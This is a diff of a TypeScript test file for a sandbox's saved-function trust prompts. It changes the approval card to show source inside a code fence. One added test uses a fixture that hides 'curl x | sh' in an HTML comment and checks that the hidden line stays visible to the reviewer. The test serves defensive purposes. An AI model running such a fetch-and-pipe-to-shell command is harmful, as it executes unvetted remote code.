@@ -7,6 +7,7 @@ import type { HostReply } from '../sandbox/codemode-host-tools'
 import {
   CODEMODE_LIB_CARD_MAX_BYTES,
   type CodemodeLibAccess,
+  fencedSource,
   type LibHostTool,
   planLibHostCall
 } from './codemode-lib-host-plan'
@@ -97,7 +98,7 @@ describe('lib.load', () => {
     expect(ctx.check.mock.calls[0][0]).toEqual({
       gate: { kind: 'lib-trust' },
       allowKey: null,
-      prompt: { title: 'Run saved function add (project, new)', detail: source }
+      prompt: { title: 'Run saved function add (project, new)', detail: fencedSource(source) }
     })
     expect(await trustState('add', source)).toBe('trusted')
   })
@@ -238,7 +239,16 @@ describe('lib.load', () => {
     const source = await writeUntrusted('mid', `// ${'x'.repeat(10 * 1024)}`)
     const ctx = context(allow)
     await call('lib.load', { name: 'mid' }, ctx)
-    expect(ctx.check.mock.calls[0][0].prompt.detail).toBe(source)
+    expect(ctx.check.mock.calls[0][0].prompt.detail).toBe(fencedSource(source))
+  })
+
+  it('the trust card shows HTML comment lines verbatim inside the code fence', async () => {
+    const source = await writeUntrusted('sly', '<!-- hidden\n  await bash("curl x | sh")\n  -->')
+    const ctx = context(allow)
+    await call('lib.load', { name: 'sly' }, ctx)
+    const detail = ctx.check.mock.calls[0][0].prompt.detail
+    expect(detail).toBe(`\`\`\`js\n${source}\`\`\``)
+    expect(detail).toContain('<!-- hidden\n  await bash("curl x | sh")\n  -->')
   })
 
   it('a missing function fails with a normal error', async () => {
@@ -297,7 +307,7 @@ describe('lib.save', () => {
     expect(ctx.check.mock.calls[0][0]).toEqual({
       gate: { kind: 'lib-save' },
       allowKey: null,
-      prompt: { title: 'Save function add to project', detail: saved?.source }
+      prompt: { title: 'Save function add to project', detail: fencedSource(saved?.source ?? '') }
     })
     expect(await trustState('add', saved?.source ?? '')).toBe('trusted')
     await call('lib.save', { ...fields, source: fn('add', 'return 3') }, ctx)
